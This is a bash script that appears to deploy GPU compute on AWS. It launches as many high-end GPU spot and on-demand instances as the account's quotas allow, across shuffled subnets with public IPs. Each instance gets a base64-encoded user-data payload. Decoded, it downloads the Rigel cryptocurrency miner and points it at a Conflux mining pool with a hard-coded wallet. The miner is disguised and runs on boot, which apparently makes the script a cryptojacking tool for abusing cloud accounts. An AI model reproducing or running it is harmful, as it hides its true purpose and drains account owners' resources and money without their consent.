#!/bin/bash
export AWS_PAGER=""

# Define instance types and their respective vCPU counts (High to Low Priority)
# Format: "instance_type:vcpu_per_instance"
INSTANCE_TYPES=(
    "p6-b200.48xlarge:192"
    "p5en.48xlarge:192"
    "p5e.48xlarge:192"
    "p5.48xlarge:192"
    "p4de.24xlarge:96"
    "p4d.24xlarge:96"
    "p3dn.24xlarge:96"
    "p3.16xlarge:64"
    "g6e.48xlarge:192"
    "g6.48xlarge:192"
    "g5.48xlarge:192"
)

# Quota Settings
ON_DEMAND_QUOTA=768
SPOT_QUOTA=384

USED_OD_VCPU=0
USED_SPOT_VCPU=0

AMI_ID="ami-0babae1521ca1a4c3"

# Get Default Security Group
SG_ID=$(aws ec2 describe-security-groups --filters "Name=group-name,Values=default" --query "SecurityGroups[0].GroupId" --output text)

# Get and Shuffle Subnets
SUBNETS=$(aws ec2 describe-subnets --query "Subnets[*].SubnetId" --output text | tr '\t' '\n' | shuf)

echo "Starting deployment..."
echo "Quotas: On-Demand ($ON_DEMAND_QUOTA vCPU) | Spot ($SPOT_QUOTA vCPU)"
echo "------------------------------------------------"

for ENTRY in "${INSTANCE_TYPES[@]}"; do
    TYPE=${ENTRY%%:*}
    VCPU_PER_INST=${ENTRY#*:}

    # Strategy: Try to fill SPOT first, then ON-DEMAND
    # We will attempt to launch for each market type
    for MARKET in "spot" "on-demand"; do
        
        # Calculate availability based on market type
        if [ "$MARKET" == "spot" ]; then
            REMAINING=$((SPOT_QUOTA - USED_SPOT_VCPU))
            MARKET_OPT="--instance-market-options '{\"MarketType\":\"spot\"}'"
        else
            REMAINING=$((ON_DEMAND_QUOTA - USED_OD_VCPU))
            MARKET_OPT=""
        fi

        MAX_COUNT=$((REMAINING / VCPU_PER_INST))

        if [ "$MAX_COUNT" -le 0 ]; then
            continue
        fi

        echo "[Checking $MARKET] Type: $TYPE | Available Quota: $REMAINING vCPU | Can fit: $MAX_COUNT units"

        for SUBNET_ID in $SUBNETS; do
            AZ=$(aws ec2 describe-subnets --subnet-ids $SUBNET_ID --query "Subnets[0].AvailabilityZone" --output text)
            
            echo "Attempting $MAX_COUNT unit(s) of $TYPE ($MARKET) in $AZ..."

            # Execute Run Instances
            # Note: We use eval because of the conditional MARKET_OPT string
            COMMAND="aws ec2 run-instances \
                --image-id $AMI_ID \
                --instance-type $TYPE \
                --count $MAX_COUNT \
                $MARKET_OPT \
                --network-interfaces '[{\"SubnetId\":\"$SUBNET_ID\",\"AssociatePublicIpAddress\":true,\"DeviceIndex\":0,\"Groups\":[\"$SG_ID\"]}]' \
                --user-data "IyEvYmluL2Jhc2gKc3VkbyB3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS9yaWdlbG1pbmVyL3JpZ2VsL3JlbGVhc2VzL2Rvd25sb2FkLzEuMjMuMS9yaWdlbC0xLjIzLjEtbGludXgudGFyLmd6CnN1ZG8gdGFyIC14ZiByaWdlbC0xLjIzLjEtbGludXgudGFyLmd6CnN1ZG8gcmlnZWwtMS4yMy4xLWxpbnV4L3JpZ2VsIC1hIG9jdG9wdXMgLW8gc3RyYXR1bSt0Y3A6Ly91czIuY29uZmx1eC5oZXJvbWluZXJzLmNvbToxMTcwIC11IGNmeDphYWs0emVzN25meGo1ejdrajQwdzQ3emE5YzZtYXA1YnphanB2bjhleTIgLXcgc2t5Ymx1ZQo=" \
                --query 'Instances[*].InstanceId' \
                --output text 2>&1"
            
            RESULT=$(eval $COMMAND)

            if [[ $? -eq 0 ]]; then
                echo "SUCCESS! Launched $TYPE ($MARKET) in $AZ. IDs: $RESULT"
                
                # Update counters
                VCPU_CONSUMED=$((MAX_COUNT * VCPU_PER_INST))
                if [ "$MARKET" == "spot" ]; then
                    USED_SPOT_VCPU=$((USED_SPOT_VCPU + VCPU_CONSUMED))
                else
                    USED_OD_VCPU=$((USED_OD_VCPU + VCPU_CONSUMED))
                fi
                break # Move to next instance type
            else
                echo "FAILED in $AZ. Reason: $(echo $RESULT | head -n 1)"
            fi
        done
    done
done

echo "------------------------------------------------"
echo "Deployment Finished."
echo "Final Usage - On-Demand: $USED_OD_VCPU/$ON_DEMAND_QUOTA | Spot: $USED_SPOT_VCPU/$SPOT_QUOTA"
